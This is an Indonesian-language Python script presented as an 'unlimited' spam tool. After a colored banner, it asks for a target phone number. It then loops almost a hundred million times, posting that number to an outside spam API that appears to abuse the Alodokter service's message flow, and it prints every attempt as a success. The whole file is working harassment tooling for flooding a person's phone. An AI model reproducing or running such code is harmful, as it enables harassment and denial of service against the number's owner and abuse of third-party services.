import requests, time
import os
import sys
import random

os.system('clear')

# WARNA
now=time.strftime
Y = '\033[93m'
G = '\x1b[32m'
R = '\033[31;1m'
r = "\033[0m"
C = '\033[1;36m'
print(r)
os.system('clear')
# Checking Update
try:
    versi='1.1'
    requp=requests.get('https://raw.githubusercontent.com/zettamus/ZSpam/master/README.md').text
    if versi in str(requp):
        up=r+r+'['+G+'INFO'+r+'] Type ['+G+'99'+r+'] to update '
        update= r+'['+C+now("%X")+r+'] Updating Z Spam tools...'
        ver=r+'['+G+'INFO'+r+'] New version is available. Update now'
except: pass
# RUNNING TEXT
def mengetik(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.1)
mengetik(Y+'   ( 𝘚𝘗𝘈𝘔 𝘈𝘓𝘖𝘋𝘖𝘒 𝘜𝘕𝘓𝘐𝘔𝘐𝘛𝘌𝘋 )')
mengetik(R+' 𝘈𝘜𝘛𝘏𝘖𝘙 𝘐𝘛:')
print(""" ══╦╗────╔╗─╔╗╔╗
╚╗╔╣╚╦═╦═╣╚╗║╚╝╠═╦╦╗
─║║║║║╬║║║╩║╚╗╔╣║║║║
─╚╝╚╩╩╩╩╩╩╩╝─╚╝╚═╩═╝ 𝙎𝙋𝘼𝙈 𝙐𝙉𝙇𝙄𝙈𝙄𝙏𝙀𝘿""") 



print("""\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑\033[1;31m :\033[1;0m 𝐌𝐀𝐇𝐄𝐍𝐃𝐑𝐀
\033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄\033[1;31m : \033[1;0m𝐓𝐔𝐑𝐎𝐑𝐈𝐀𝐋 𝐔𝐓𝐀𝐌𝐀""") 
print(C+']────────────||────────────────[')
print('')

num=input("[In] 𝗧𝗨𝗝𝗨𝗔𝗡 𝗛𝗜𝗗𝗨𝗣: ")


print("\n[HASIL]")
for x in range(99999999):
	try:
		req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok",
			data={"number":num})
		if req.json()['status'] == 'ok':
			print(f"{x+1}. Berhasil {num}")
		else:
			print(f"{x+1}. Berhasil {num}")
	except Exception as e:
		print(f"{x+1}. Pass: {e}")
